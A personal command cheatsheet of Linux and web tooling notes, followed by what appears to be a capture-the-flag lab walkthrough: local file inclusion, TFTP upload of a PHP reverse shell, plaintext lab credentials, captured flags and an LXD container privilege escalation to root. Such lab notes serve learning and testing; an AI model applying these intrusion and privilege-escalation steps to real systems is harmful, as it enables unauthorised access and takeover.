
### Linux Version
```
# The following commands can all find os name and version in Linux:
cat /etc/os-release
lsb_release -a
hostnamectl

# Find Linux kernel version
uname -r 
```
`usermod -aG sudo <USERNAME>  # add <USERNAME> to the sudoers group` 


Create a webserver with node
`npx http-server -p 9999`


Disable the CSS by pasting the following into the dev tools console
`var el = document.querySelectorAll('style,link'); for (var i=0; i<el.length; i++) {el[i].parentNode.removeChild(el[i]);};`


`brew install mitmproxy`
`pip3 install mitmproxy2swagger # Plugin to scrape an api of all its endpoints`


CMD: `zip -r <FILETOEXTRACT> $(find /opt/ibm/isim/ -name "*.jar")`


`grep MemTotal /proc/meminfo` - Get the total ram/Memory of the system


`for i in $(compgen -a); do alias $i ; done` # List all the aliases and the see what commmands they actually do



`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null` # List of all SUID and SGID Executables - from : https://atom.hackstreetboys.ph/linux-privilege-escalation-suid-sgid-executables/



`watch -n 60 "date && free -h"` # Run two commands in watch at the same time every 60 seconds


### Regexes for vs code

`password(.*)"(.*)"`# find the term "password" followed by anything and then a pair of quotations marks with text within them
`auth(.*)"(.*)"`# find the term "auth" followed by anything and then a pair of quotations marks with text within them


`detect-secrets -C . scan > .secrets.basline` # Run detect secrts and make a basline file for the repo
`detect-secrets audit .secrets.baseline`

`trufflehog --regex <FULLPATHTOCODE>`



### Cheatsheet

`alias chee='callCheatSh(){ curl cheat.sh/"$@" ;}; callCheatSh'`


TMP




LFI - http://10.129.95.185/?file=/etc/passwd

gobuster dir -u http://10.129.95.185 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  
nikto -C all -h 10.129.95.185

tftp 10.129.95.185:69 -c id

Trivial File Transfer Protocol (TFTP) is a simple protocol that provides basic file transfer function with no user authentication. TFTP is intended for applications that do not need the sophisticated interactions that File Transfer Protocol (FTP) provides.  It is also revealed that TFTP uses the User Datagram Protocol (UDP) to communicate. This is defined as a lightweight data transport protocol that works on top of IP.


UDP - UDP provides a mechanism to detect corrupt data in packets, but it does not attempt to solve other problems that arise with packets, such as lost or out of order packets.
It is implemented in the transport layer of the OSI Model, known as a fast but not reliable protocol, unlike TCP, which is reliable, but slower then UDP.
Just like how TCP contains open ports for protocols such as HTTP, FTP, SSH and etcetera, the same way UDP has ports for protocols that work for UDP.


RevShell from - http://10.129.29.207/?file=/var/lib/tftpboot/shell.php


web-related files are usually stored in the `/var/www/html` folder,


CREDS: mike:Sheffield19

mike:Sheffield19
www-data@included:/var/www/html$ su mike
su mike
Password: Sheffield19

mike@included:/var/www/html$ cat /home/mike/user.txt
cat /home/mike/user.txt
a56ef91d70cfbf2cdb8f454c006935a1
mike@included:/var/www/html$ 


mike@included:/var/www/html$ cat .htaccess
cat .htaccess
RewriteEngine On
RewriteCond %{THE_REQUEST} ^GET.*index\.php [NC]
RewriteRule (.*?)index\.php/*(.*) /$1$2 [R=301,NE,L]
#<Files index.php>
#AuthType Basic
#AuthUserFile /var/www/html/.htpasswd
#Require valid-user


LXD - LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to
match the permissions of the calling user to the function it is asked to perform.


To REad - https://www.hackingarticles.in/lxd-privilege-escalation/

Linux Container (LXC) are often considered as a lightweight virtualization technology that is something in the middle between a chroot and a completely developed virtual machine, which creates an environment as close as possible to a Linux installation but without the need for a separate kernel.

Linux daemon (LXD) is the lightervisor, or lightweight container hypervisor. LXD is building on top of a container technology called LXC which was used by Docker before. It uses the stable LXC API to do all the container management behind the scene, adding the REST API on top and providing a much simpler, more consistent user experience.

CMD: apt install lxd
CMD: apt install zfsutils-linux
CMD: usermod --append --groups lxd Bob
CMD: lxd init
CMD: lxc launch ubuntu:18.04
CMD: lxc list

LXD PRivesc
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine


lxc init myimageNasty ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id

/mnt/root # cat root/root.txt
cat root/root.txt
c693d9c7499d9f572ee375d4c14c7bcf
/mnt/root # ^[[41;13R

